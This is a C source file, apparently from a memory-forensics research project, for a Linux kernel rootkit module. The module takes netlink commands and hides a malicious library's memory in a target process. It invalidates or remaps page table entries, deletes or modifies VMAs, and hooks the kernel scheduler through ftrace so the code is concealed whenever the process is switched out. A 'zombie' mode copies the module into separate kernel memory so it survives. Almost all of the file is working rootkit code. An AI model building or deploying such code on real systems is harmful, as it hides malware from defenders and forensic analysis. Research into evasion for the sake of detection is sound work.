/* rootkit_module.c -- installs and sets up rootkit
 *
 * Copyright (C) 2019 Patrick Reichenberger
 * Additional Authors:
 * Frank Block, ERNW Research GmbH <fblock@ernw.de>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 */
#include <linux/module.h>

#include <net/sock.h>
#include <linux/ftrace.h>
#include <linux/vmalloc.h>
#include <linux/kernel.h>

#include "rootkit_module.h"
#include "debug.h"
#include "helper.h"
#include "pte_helper.h"
#include "pte_modify.h"
#include "pte_vma_delete.h"
#include "vma_modify.h"

MODULE_LICENSE("GPL");

#ifdef ZOMBIE_HIDE
/* Module parameters */
/* Path of module ELF file */
static char *mod_elf_path = "";
module_param(mod_elf_path, charp, 0660);

/* Size of module ELF file */
static int mod_elf_size = 0;
module_param(mod_elf_size, int, 0660);
#endif

static struct sock *nlsock;

/* Global control variables for hiding techniques, set for specific hiding techniques */
static int enable_tech = 0; // 1 means hiding is enabled
int technique = -1; // See hiding technique enum in header.
static char mallibpath[64];
static char benlibpath[64];
static int glob_pid = -1;
static int mode = -1; // See mode enum in header.

#ifdef ZOMBIE_HIDE
static void *zombie_memory;
static int zombie_mem_size;
#endif

/** netlink_send_msg - send netlink message.
 *  @pid: pid
 *  @kern_msg: message to send
 *
 *  Sends a netlink message to the PID.
 *
 */
void netlink_send_msg(int pid, char *kern_msg) {
    struct nlmsghdr *nlh;
    /* For response message */
    int msg_size;
    struct sk_buff *skb_out;
    int send_stat;

    msg_size = strlen(kern_msg);

    /* Allocate a new netlink message using the size of the payload */
    skb_out = nlmsg_new(msg_size, 0);
    memset(skb_out, 0x0, msg_size + 1);
    if(!skb_out) {
        log_print(LOG_ERR, "Error in allocating socket buffer for message", 0);
        return;
    }

    /* Add a message to the socket buffer. Builds a netlink message header,
     * copies it into the message and returns the pointer to the netlink message header
     */
    nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
    if(!nlh) {
        log_print(LOG_ERR, "Error in adding message to socket buffer", 0);
        return;
    }
    NETLINK_CB(skb_out).dst_group = 0;
    /* Copy the payload into the message */
    strncpy(nlmsg_data(nlh), kern_msg, msg_size);
    /* Send the message to the specified PID */
    send_stat = nlmsg_unicast(nlsock, skb_out, pid);
    if(send_stat) {
        log_print(LOG_ERR, "Error in sending message", 0);
        return;
    }
}

/** reset_global_ctl_vars - reset the global control variables.
 *
 *  Reset the global control variables, so for a new command no old data remains.
 */
void reset_global_ctl_vars(void) {
    log_print(LOG_DEBUG, "Reset global vars..");
    enable_tech = 0;
    technique = -1;
    memset(mallibpath, 0, 64);
    memset(benlibpath, 0, 64);
    mode = -1;
}


/** pte_invalidate_anon_parser - command parser for invalidating PTEs for anonymous memory
 *  @token: command message
 *  @msg_pp: command message
 *  @pid: pid
 *
 *  Parses the command and instructs hiding for PTE invalidate technique.
 */
void pte_invalidate_anon_parser(char *token, char **msg_pp, int pid) {
    reset_global_ctl_vars();

    /* Determine hide/reveal mode */
    if (!strcmp(token, "pteinvalidateanon")) {
        mode = HIDE;
    } else {
        mode = REVEAL;
    }

    char * vm_start_string;
    // const char* vm_start_string;

    strsep(msg_pp, "\"");
    vm_start_string = strsep(msg_pp, "\"");
    unsigned long long vm_start = 0;
    if(vm_start_string){
        // strcat(mallibpath, token);
        log_print(LOG_ERR, "vm_start is: %s", vm_start_string);
        // kstrtoull(vm_start_string, 16, vm_start);
        vm_start = simple_strtoull(vm_start_string, NULL, 16);
        if (vm_start <= 0){
            log_print(LOG_ERR, "Error during conversion.");
            return;
        }
        log_print(LOG_ERR, "vm_start after conversion: %llx", vm_start);
    } else {
        log_print(LOG_ERR, "Error in parsing vm_start.");
        return;
    }

#ifdef MANUAL_MODE
    /* If the manual mode is activated, invalidate the PTEs */
    pte_invalidate_anon_handler(vm_start, pid, mode);
    /* Answer not necessary, can be used for acknowledgement */
    //netlink_send_msg(pid, "Command received.");
#else
    /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
    // TODO adjust for this technique
    // enable_tech = 1;
    // technique = INVALIDATE_PTES;
    /* Answer not necessary, can be used for acknowledgement */
    //netlink_send_msg(pid, "Automatic hiding started..");
#endif
}


/** mas_remapping_parser - handler for MAS remapping
 *  @token: command message
 *  @msg_pp: command message
 *  @pid: pid
 *
 *  Parses the command and either does or undoes MAS remapping.
 */
void mas_remapping_parser(char *token, char **msg_pp, int pid) {
    reset_global_ctl_vars();

    /* Determine hide/reveal mode */
    if (!strcmp(token, "masremapping")) {
        mode = HIDE;
    } else {
        mode = REVEAL;
    }

    char * vm_start_string;
    // const char* vm_start_string;

    strsep(msg_pp, "\"");
    vm_start_string = strsep(msg_pp, "\"");
    unsigned long long vm_start = 0;
    if(vm_start_string){
        // strcat(mallibpath, token);
        log_print(LOG_ERR, "vm_start is: %s", vm_start_string);
        // kstrtoull(vm_start_string, 16, vm_start);
        vm_start = simple_strtoull(vm_start_string, NULL, 16);
        if (vm_start <= 0){
            log_print(LOG_ERR, "Error during conversion.");
            return;
        }
        log_print(LOG_ERR, "vm_start after conversion: %llx", vm_start);
    } else {
        log_print(LOG_ERR, "Error in parsing vm_start.");
        return;
    }

#ifdef MANUAL_MODE
    /* If the manual mode is activated, invalidate the PTEs */
    mas_remapping_handler(vm_start, pid, mode);
    /* Answer not necessary, can be used for acknowledgement */
    //netlink_send_msg(pid, "Command received.");
#else
    /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
    // TODO adjust for this technique
    // enable_tech = 1;
    // technique = INVALIDATE_PTES;
    /* Answer not necessary, can be used for acknowledgement */
    //netlink_send_msg(pid, "Automatic hiding started..");
#endif
}


/** pte_invalidate_parser - command parser for invalidating PTEs
 *  @token: command message
 *  @msg_pp: command message
 *  @pid: pid
 *
 *  Parses the command and instructs hiding for PTE invalidate technique.
 */
void pte_invalidate_parser(char *token, char **msg_pp, int pid) {
    reset_global_ctl_vars();

    /* Determine hide/reveal mode */
    if (!strcmp(token, "pteinvalidate")) {
        mode = HIDE;
    } else {
        mode = REVEAL;
    }

    /* Parse the argument */
    strcpy((char *) mallibpath, "memfd:");
    token = strsep(msg_pp, "\"");
    token = strsep(msg_pp, "\"");
    if(token){
        strcat(mallibpath, token);
        log_print(LOG_DEBUG, "Path of malicious library is: %s", mallibpath);
    } else {
        log_print(LOG_ERR, "Error in parsing malicious library path.");
        return;
    }

#ifdef MANUAL_MODE
    /* If the manual mode is activated, invalidate the PTEs */
    pte_invalidate_handler(mallibpath, pid, mode);
    /* Answer not necessary, can be used for acknowledgement */
    //netlink_send_msg(pid, "Command received.");
#else
    /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
    enable_tech = 1;
    technique = INVALIDATE_PTES;
    /* Answer not necessary, can be used for acknowledgement */
    //netlink_send_msg(pid, "Automatic hiding started..");
#endif
}

/** pte_remap_parser - command parser for remapping PTEs
 *  @token: command message
 *  @msg_pp: command message
 *  @pid: pid
 *
 *  Parses the command and instructs hiding for PTE remapping technique.
 */
void pte_remap_parser(char *token, char **msg_pp, int pid) {
    reset_global_ctl_vars();

    if (!strcmp(token, "pteremap")) {
        log_print(LOG_INFO, "Change pages of VMAs.");
        mode = HIDE;

        /* Parse the first argument */
        strcpy((char *) mallibpath, "memfd:");
        token = strsep(msg_pp, "\"");
        token = strsep(msg_pp, "\"");
        if(token){
            strcat(mallibpath, token);
            log_print(LOG_DEBUG, "Path of malicious library is: %s", mallibpath);
        } else {
            log_print(LOG_ERR, "Error in parsing malicious library path.");
            return;
        }

#ifdef MANUAL_MODE
        /* If the manual mode is activated, remap the pages */
        pte_remap_handler(mallibpath, pid, mode);
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Command received.");
#else
        /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
        enable_tech = 1;
        technique = REMAP_PAGES;
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Automatic hiding started..");
#endif
    } else if(!strcmp(token, "ptereset")) {
        mode = REVEAL;

        /* Parse the first argument */
        strcpy((char *) mallibpath, "memfd:");
        token = strsep(msg_pp, "\"");
        token = strsep(msg_pp, "\"");
        if(token){
            strcat(mallibpath, token);
            log_print(LOG_DEBUG, "Path of malicious library is: %s", mallibpath);
        } else {
            log_print(LOG_ERR, "Error in parsing malicious library path.");
            return;
        }

#ifdef MANUAL_MODE
        /* If the manual mode is activated, reset the pages */
        pte_remap_handler(mallibpath, pid, mode);
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Command received.");
#endif
    }
}


void pte_remap_parser_anon(char *token, char **msg_pp, int pid) {
    reset_global_ctl_vars();
    MemoryMode mem_mode;

    if (!strcmp(token, "pteremapanon_p")) {
        log_print(LOG_INFO, "Starting PTE remapping with private anonymous memory.");
        mode = HIDE;
        mem_mode = ANON_PRIVATE_MEMORY;
    }
    else if (!strcmp(token, "pteremapanon_s")){
        log_print(LOG_INFO, "Starting PTE remapping with shared anonymous memory.");
        mode = HIDE;
        mem_mode = ANON_SHARED_MEMORY;
    }
    else if (!strcmp(token, "pteresetanon_p")){
        log_print(LOG_INFO, "Restoring PTE remapping for private anonymous memory.");
        mode = REVEAL;
        mem_mode = ANON_PRIVATE_MEMORY;
    }
    else if (!strcmp(token, "pteresetanon_s")){
        log_print(LOG_INFO, "Restoring PTE remapping for shared anonymous memory.");
        mode = REVEAL;
        mem_mode = ANON_SHARED_MEMORY;
    }
    else{
        log_print(LOG_ERR, "Unknown command: %s\n.", token);
        return;
    }

        char * vm_start_string;
        // const char* vm_start_string;

        strsep(msg_pp, "\"");
        vm_start_string = strsep(msg_pp, "\"");
        unsigned long long vm_start = 0;
        if(vm_start_string){
            // strcat(mallibpath, token);
            log_print(LOG_ERR, "vm_start is: %s", vm_start_string);
            // kstrtoull(vm_start_string, 16, vm_start);
            vm_start = simple_strtoull(vm_start_string, NULL, 16);
            if (vm_start <= 0){
                log_print(LOG_ERR, "Error during conversion.");
                return;
            }
            log_print(LOG_ERR, "vm_start after conversion: %llx", vm_start);
        } else {
            log_print(LOG_ERR, "Error in parsing malicious library path.");
            return;
        }

#ifdef MANUAL_MODE
        /* If the manual mode is activated, remap the pages */
        pte_remap_handler_anon(vm_start, pid, mode, mem_mode);
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Command received.");
#else
        /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
        // TODO adjust for this technique
        //enable_tech = 1;
        //technique = REMAP_PAGES;
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Automatic hiding started..");
#endif
}


/** vma_delete_parser - command parser for deleting VMAs
 *  @token: command message
 *  @msg_pp: command message
 *  @pid: pid
 *
 *  Parses the command and instructs hiding for VMA deletion technique.
 */
void vma_delete_parser(char* token, char** msg_pp, int pid) {
    reset_global_ctl_vars();

    if (!strcmp(token, "vmadelete")) {
        mode = HIDE;
        log_print(LOG_INFO, "Delete VMAs.");

        /* Parse the first argument */
        strcpy((char *) mallibpath, "memfd:");
        token = strsep(msg_pp, "\"");
        token = strsep(msg_pp, "\"");
        if(token){
            strcat(mallibpath, token);
            log_print(LOG_DEBUG, "Path of malicious library is: %s", mallibpath);
        } else {
            log_print(LOG_ERR, "Error in parsing malicious library path.");
            return;
        }

#ifdef MANUAL_MODE
        /* If the manual mode is activated, delete the VMAs */
        vma_delete_handler(mallibpath, mode, pid);
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Command received.");
#else
        /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
        enable_tech = 1;
        technique = DELETE_VMAS;
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Automatic hiding started..");
#endif

    } else if(!strcmp(token, "vmarestore")) {
        mode = REVEAL;
        log_print(LOG_INFO, "Restore VMAs.");

        /* Parse the first argument */
        strcpy((char *) mallibpath, "memfd:");
        token = strsep(msg_pp, "\"");
        token = strsep(msg_pp, "\"");
        if(token){
            strcat(mallibpath, token);
            log_print(LOG_DEBUG, "Path of malicious library is: %s", mallibpath);
        } else {
            log_print(LOG_ERR, "Error in parsing malicious library path.");
            return;
        }

#ifdef MANUAL_MODE
        /* If the manual mode is activated, restore the VMAs */
        vma_delete_handler(mallibpath, mode, pid);
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Command received.");
#endif
    }
}

/** vma_modify_parser - command parser for modifying VMA limits
 *  @token: command message
 *  @msg_pp: command message
 *  @pid: pid
 *
 *  Parses the command and instructs hiding for VMA limits modification technique.
 */
void vma_modify_parser(char* token, char** msg_pp, int pid) {
    reset_global_ctl_vars();

    if (!strcmp(token, "vmaremapping")) {
        mode = HIDE;
        log_print(LOG_INFO, "Change VMAs boundaries.");

        /* Parse the first argument */
        strcpy((char *) mallibpath, "memfd:");
        token = strsep(msg_pp, "\"");
        token = strsep(msg_pp, "\"");
        if(token){
            strcat(mallibpath, token);
            log_print(LOG_DEBUG, "Path of malicious library is: %s", mallibpath);
        } else {
            log_print(LOG_ERR, "Error in parsing malicious library path.");
            return;
        }

        /* Parse the second argument */
        strcpy((char *) benlibpath, "memfd:");
        token = strsep(msg_pp, "\"");
        token = strsep(msg_pp, "\"");
        if(token){
            strcat(benlibpath, token);
            log_print(LOG_DEBUG, "Path of benign library is: %s", benlibpath);
        } else {
            log_print(LOG_ERR, "Error in parsing benign library path.");
            return;
        }

#ifdef MANUAL_MODE
        /* If the manual mode is activated, modify the VMA limits */
        vma_modify_handler(mallibpath, benlibpath, mode, pid);
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Command received.");
#else
        /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
        enable_tech = 1;
        technique = MODIFY_VMA_LIMITS;
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Automatic hiding started..");
#endif
    } else if(!strcmp(token, "vmareset")) {
        mode = REVEAL;
        strcpy((char *) mallibpath, "memfd:");
        token = strsep(msg_pp, "\"");
        token = strsep(msg_pp, "\"");
        if(token) {
            strcat(mallibpath, token);
        } else {
            return;
        }
        log_print(LOG_DEBUG, "Path of malicious library is: %s", mallibpath);

#ifdef MANUAL_MODE
        /* If the manual mode is activated, reset the VMA limits */
        vma_modify_handler(mallibpath, benlibpath, mode, pid);
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Command received.");
#endif
    }
}


/** pte_vma_delete_parser - command parser for deleting VMAs
 *  @token: command message
 *  @msg_pp: command message
 *  @pid: pid
 *
 *  Parses the command and instructs hiding for VMA deletion technique.
 */
void pte_vma_delete_parser(char* token, char** msg_pp, int pid) {
    reset_global_ctl_vars();
    if (!strcmp(token, "ptevmadelete")) {
        mode = HIDE;
        log_print(LOG_INFO, "Invalidate PTEs and delete VMAs.");

        /* Parse the first argument */
        strcpy((char *) mallibpath, "memfd:");
        token = strsep(msg_pp, "\"");
        token = strsep(msg_pp, "\"");
        if(token){
            strcat(mallibpath, token);
            log_print(LOG_DEBUG, "Path of malicious library is: %s", mallibpath);
        } else {
            log_print(LOG_ERR, "Error in parsing malicious library path.");
            return;
        }

#ifdef MANUAL_MODE
        /* If the manual mode is activated, delete the VMAs */
        technique = DELETE_PTES_VMAS;
        pte_vma_delete_handler(mallibpath, mode, pid);
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Command received.");
#else
        /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
        enable_tech = 1;
        technique = DELETE_PTES_VMAS;
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Automatic hiding started..");
#endif

    } else if(!strcmp(token, "ptevmarestore")) {
        mode = REVEAL;
        log_print(LOG_INFO, "Restore VMAs.");

        /* Parse the first argument */
        strcpy((char *) mallibpath, "memfd:");
        token = strsep(msg_pp, "\"");
        token = strsep(msg_pp, "\"");
        if(token){
            strcat(mallibpath, token);
            log_print(LOG_DEBUG, "Path of malicious library is: %s", mallibpath);
        } else {
            log_print(LOG_ERR, "Error in parsing malicious library path.");
            return;
        }

#ifdef MANUAL_MODE
        /* If the manual mode is activated, restore the VMAs */
        technique = DELETE_PTES_VMAS;
        pte_vma_delete_handler(mallibpath, mode, pid);
        /* Answer not necessary, can be used for acknowledgement */
        //netlink_send_msg(pid, "Command received.");
#endif
    }
}

/** user_netlink_rcv_msg - callback function for receiving netlink message
 *  @sk_buff: socket buffer containing the message
 *
 *  When a netlink message is received by the rootkit, it is checked whether the content of the message
 *  is a command that instructs hiding/revealing.
 */
void user_netlink_rcv_msg(struct sk_buff *skb) {
    struct nlmsghdr *nlh;
    int pid;

    /* For message/command handling */
    char msg_[1024];
    char *msg = msg_;
    char **msg_pp = &msg;
    char *token;

    nlh = (struct nlmsghdr *)skb->data;
    pid = nlh->nlmsg_pid;
    glob_pid = pid;
    log_print(LOG_INFO, "Netlink received message from PID %d: %s\n", pid, (char *) nlmsg_data(nlh));

    strcpy(msg_, (char *) nlmsg_data(nlh));
    token = strsep(msg_pp, " ");
    if (*token == '\0') {
        return;
    } else if(strcmp(token, "pteinvalidate") == 0 || strcmp(token, "pterestore") == 0) {
        pte_invalidate_parser(token, msg_pp, pid);
    } else if(strcmp(token, "pteinvalidateanon") == 0 || strcmp(token, "pterestoreanon") == 0) {
        pte_invalidate_anon_parser(token, msg_pp, pid);
    } else if(strcmp(token, "masremapping") == 0 || strcmp(token, "masremapping_reset") == 0) {
        mas_remapping_parser(token, msg_pp, pid);
    } else if(strcmp(token, "pteremap") == 0 || strcmp(token, "ptereset") == 0) {
        pte_remap_parser(token, msg_pp, pid);
    } else if(strcmp(token, "pteremapanon_p") == 0 || strcmp(token, "pteremapanon_s") == 0 || strcmp(token, "pteresetanon_p") == 0 || strcmp(token, "pteresetanon_s") == 0) {
        pte_remap_parser_anon(token, msg_pp, pid);
    } else if(!strcmp(token, "vmadelete") || !strcmp(token, "vmarestore")) {
        vma_delete_parser(token, msg_pp, pid);
    } else if(!strcmp(token, "vmaremapping") || !strcmp(token, "vmareset")) {
        vma_modify_parser(token, msg_pp, pid);
    } else if(!strcmp(token, "ptevmadelete") || !strcmp(token, "ptevmarestore")) {
        pte_vma_delete_parser(token, msg_pp, pid);
    }

#ifndef MANUAL_MODE
    /* Close socket in automatic mode after hiding is activated */
    netlink_kernel_release(nlsock);
#endif
}


#ifdef ZOMBIE_HIDE
/** get_zombie_address - address in zombie memory for address in module
 *  @addr_in_mod: address in the module
 *
 *  Calculate based on the offset into the module memory the address of some data in zombie memory
 *
 */
void *get_zombie_address(void *addr_in_mod) {
    return ((void *) zombie_memory + (addr_in_mod - (void *) THIS_MODULE->core_layout.base));
}
#endif

/* =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-= FTRACE -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= */
#ifndef MANUAL_MODE

/**
 * struct ftrace_hook    describes the hooked function
 *
 * @name:           the name of the hooked function
 *
 * @function:       the address of the wrapper function that will be called instead of
 *                  the hooked function
 *
 * @original:       a pointer to the place where the address of the hooked function
 *                  should be stored, filled out during installation of the hook
 *
 * @address:        the address of the hooked function, filled out during installation
 *                  of the hook
 *
 * @ops:            ftrace service information, initialized by zeros;
 *                  initialization is finished during installation of the hook
 *
 *
 *  Author: Alexey Lozovsky, Sergey Stepanchuk
 *  https://www.apriorit.com/dev-blog/546-hooking-linux-functions-2
 */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

struct rq;

/* Function pointer to original function pick_next_task_fair that is hooked */
static struct task_struct *(*real_pick_next_task_fair)(struct rq *rq, struct task_struct *prev, struct pin_cookie cookie);


/** fh_pick_next_task_fair - the hook; function called instead of original one
 *  @params: The parameters must match the original one
 *
 *  This function serves as a wrapper for the hooked function and allows to run code before, after or instead the
 *  hooked function.
 */
static struct task_struct *fh_pick_next_task_fair(struct rq *rq, struct task_struct *prev, struct pin_cookie cookie) {
    struct task_struct *ret;

    /* Call the original function.
     * This returns the next task to be called.
     * The one that ran is stored in prev argument
     */
    ret = real_pick_next_task_fair(rq, prev, cookie);

    /* If previous task is the infected one, hide the data depending on technique specified in global control variable */
    if (prev) {
        if (glob_pid != -1 && glob_pid == prev->pid) {
            log_print(LOG_INFO, "Prev is mal process PID %d\nHide..", prev->pid);
            if (enable_tech) {
                if (technique == INVALIDATE_PTES) {
                    pte_invalidate_handler(mallibpath, glob_pid, HIDE);
                } else if (technique == REMAP_PAGES) {
                    pte_remap_handler(mallibpath, glob_pid, HIDE);
                } else if (technique == DELETE_VMAS) {
                    vma_delete_handler(mallibpath, HIDE, glob_pid);
                } else if (technique == MODIFY_VMA_LIMITS) {
                    vma_modify_handler(mallibpath, benlibpath, HIDE, glob_pid);
                } else if (technique == DELETE_PTES_VMAS) {
                    pte_vma_delete_handler(mallibpath, HIDE, glob_pid);
                }
            }
        }
    }

    /* If the next task is the infected one, reveal the data depending on technique specified in global control variable */
    if (ret) {
        if (glob_pid != -1 && glob_pid == ret->pid) {
            log_print(LOG_INFO, "Mal proc is to be run PID %d\nReveal..", ret->pid);
            if (enable_tech) {
                if (technique == INVALIDATE_PTES) {
                    pte_invalidate_handler(mallibpath, glob_pid, REVEAL);
                } else if (technique == REMAP_PAGES) {
                    pte_remap_handler(mallibpath, glob_pid, REVEAL);
                } else if (technique == DELETE_VMAS) {
                    vma_delete_handler(mallibpath, REVEAL, glob_pid);
                } else if (technique == MODIFY_VMA_LIMITS) {
                    vma_modify_handler(mallibpath, benlibpath, REVEAL, glob_pid);
                } else if (technique == DELETE_PTES_VMAS) {
                    pte_vma_delete_handler(mallibpath, REVEAL, glob_pid);
                }
            }
        }
    }

    /* Return the next task determined to resume normal operation */
    return ret;
}

/** resolve_hook_address - resolves address of hooked function
 *  @hook: structure defining the hook parameters
 *
 *  Based on the name of the hooked function in the provided structure, the address
 *  of the function is resolved and stored in the provided structure.
 *
 *  The function was modified and is based on function of: Alexey Lozovsky, Sergey Stepanchuk
 *  https://www.apriorit.com/dev-blog/546-hooking-linux-functions-2
 *  Only zombie functionality added.
 */
static int resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address) {
        pr_debug("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

    /* Orig:    *((unsigned long*) hook->original) = hook->address; */
    /* Contains Address of real_pick_next_task_fair: &real_pick_next_task_fair */
#ifdef ZOMBIE_HIDE
    hook->original = get_zombie_address((void *) &real_pick_next_task_fair);
#endif
    *((unsigned long*) hook->original) = hook->address;

    return 0;
}


/** fh_ftrace_thunk - callback when activating hook
 *
 *  This function is called when the hook is installed.
 *  It redirects the control flow to the hook function where the target depends on whether zombie hiding is used or not.
 *
 *  The function was modified and is based on function of: Alexey Lozovsky, Sergey Stepanchuk
 *  https://www.apriorit.com/dev-blog/546-hooking-linux-functions-2
 *  Only zombie functionality added.
 */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    /* Skip the function calls from the current module. */
#ifdef ZOMBIE_HIDE
    if (!(((unsigned long) zombie_memory <= parent_ip) && (parent_ip <= (unsigned long) (zombie_memory+0x8000))) ) {
#else
    if (!within_module(parent_ip, THIS_MODULE)) {
#endif
        regs->ip = (unsigned long) hook->function;
    }
}

/** fh_install_hook - installs the hook
 *
 *  The function was modified and is based on function of: Alexey Lozovsky, Sergey Stepanchuk
 *  https://www.apriorit.com/dev-blog/546-hooking-linux-functions-2
 *  Only zombie functionality added.
 */
int fh_install_hook(struct ftrace_hook *hook) {
    int err;
    err = resolve_hook_address(hook);
    if (err)
        return err;

#ifdef ZOMBIE_HIDE
    hook->ops.func = (void *) zombie_memory + ((void *) fh_ftrace_thunk - (void *) THIS_MODULE->core_layout.base);
#else
    hook->ops.func = fh_ftrace_thunk;
#endif

    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                      | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_debug("register_ftrace_function() failed: %d\n", err);

        /* Don’t forget to turn off ftrace in case of an error. */
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);

        return err;
    }

    return 0;
}

/** fh_remove_hook - removes the hook
 *
 *  Authors: Alexey Lozovsky, Sergey Stepanchuk
 *  https://www.apriorit.com/dev-blog/546-hooking-linux-functions-2
 */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err) {
        pr_debug("unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err) {
        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
    }
}


/** struct ftrace_hook hooked_pick_next_function - contains hook information
 * @name: defines name of the hooked function
 * @function: address of hook function called instead
 * @address: address of hooked function
 */
static struct ftrace_hook hooked_pick_next_function = {
        .name = "pick_next_task_fair",
        .function = fh_pick_next_task_fair,
        .original = &real_pick_next_task_fair,
};
#endif
/* =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * =-=-=-=-=-=-=-=-=-=-=-=-=-= END FTRACE -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= */


/* =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * =-=-=-=-=-=-=-=-=-=-=-= ZOMBIE ROOTKIT -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= */
#ifdef ZOMBIE_HIDE
/** zombie_create - allocates memory for zombie rootkit
 *
 *  Allocate memory for the zombie rootkit and trigger the relocation.
 */
int zombie_create(void) {
    /* Allocate memory in module area.
     * module_alloc is not callable from LKM, so a pointer to that function is obtained and called.
     */
    void *(*mymodule_alloc)(unsigned long);
    *(&mymodule_alloc) = ((void *(*)(unsigned long)) kallsyms_lookup_name("module_alloc"));

    if (!mymodule_alloc) {
        log_print(LOG_ERR, "Failed to resolve module_alloc needed to allocate zombie memory.");
        return -1;
    }

    /* Set the global variables to be able to use them in other functions */
    zombie_memory = (*mymodule_alloc)(THIS_MODULE->core_layout.size);
    zombie_mem_size = THIS_MODULE->core_layout.size;
    if (!zombie_memory) {
        log_print(LOG_ERR, "Failed to allocate zombie memory.");
        return -1;
    }

    /* Copy the core of the module to the allocated zombie memory */
    memcpy(zombie_memory, THIS_MODULE->core_layout.base, THIS_MODULE->core_layout.size);

    zombie_relocate();
    return 0;
}


/** zombie_relocate - relocate the memory to the zombie memory area
 *
 *  Loads the module ELF file into memory to get the ELF header.
 *  Triggers the actions necessary for relocating:
 *  - rewrite section addresses
 *  - resolve symbols
 *  - perform relocation
 *
 */
void zombie_relocate(void) {
    /* Open ELF file in kernel */
    struct file *mod_file = filp_open(mod_elf_path, O_RDONLY, 0);

    void *mod_elf;

    if (mod_elf_size) {
        mod_elf = vmalloc(mod_elf_size);
    } else {
        mod_elf = 0;
    }

    if (mod_elf) {
        /* Load the ELF file in memory */
        kernel_read(mod_file, 0, mod_elf, mod_elf_size);

        /* ELF Header */
        Elf64_Ehdr *elf64_ehdr = (Elf64_Ehdr *) mod_elf;

        /* Address of the section header table, i.e. the first section header */
        Elf64_Shdr *sechdrs = mod_elf + elf64_ehdr->e_shoff;

        /* Pointer to the section name strings */
        char *secstrings = (void *) elf64_ehdr + sechdrs[elf64_ehdr->e_shstrndx].sh_offset;

        /* Rewrite the section addresses so that the ones in zombie memory indicate their address */
        reloc_rewrite_sections(elf64_ehdr, sechdrs, secstrings);
        /* Resolve the symbols in the ELF file */
        Elf64_Shdr *symtab = reloc_resolve_symbols(elf64_ehdr, sechdrs, secstrings);
        if(symtab) {
            /* Perform the relocation */
            reloc_perform_relocation(elf64_ehdr, sechdrs, secstrings, symtab);
        }

        /* The ELF file is not needed anymore, so the memory can be freed. */
        vfree(mod_elf);
        filp_close(mod_file, 0);
    }
}

/** reloc_rewrite_sections - adjusts the section addresses
 * @elf64_ehdr: Pointer to ELF header
 * @sechdrs: Pointer to section header table
 * @secstrings: Pointer to string section (contains the section names with 0 separators in between)
 *
 * Rewrite section addresses of the sections that are copied into the zombie memory and need to be relocated.
 * Otherwise set the address to the location in the memory where the ELF file is loaded
 *
 */
